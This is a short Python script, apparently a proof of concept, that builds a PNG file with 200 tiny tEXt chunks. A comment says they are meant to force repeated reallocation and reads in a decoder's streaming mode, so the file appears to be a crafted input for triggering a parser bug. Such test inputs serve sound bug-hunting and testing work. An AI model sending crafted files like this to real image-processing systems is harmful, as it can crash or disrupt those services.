import struct, zlib, pathlib

def chunk(t, d):
    return struct.pack('>I', len(d)) + t + d + struct.pack('>I', zlib.crc32(t+d)&0xffffffff)

sig=b'\x89PNG\r\n\x1a\n'
ihdr=chunk(b'IHDR', struct.pack('>IIBBBBB',1,1,8,6,0,0,0))
# create many tiny ancillary chunks to force repeated realloc/read_data in streaming mode
anc=b''.join(chunk(b'tEXt', b'k\x00v') for _ in range(200))
raw=b'\x00\x00\x00\x00\x00'
idat=chunk(b'IDAT', zlib.compress(raw))
iend=chunk(b'IEND', b'')
poc=sig+ihdr+anc+idat+iend
pathlib.Path('many_text.png').write_bytes(poc)
print(len(poc))
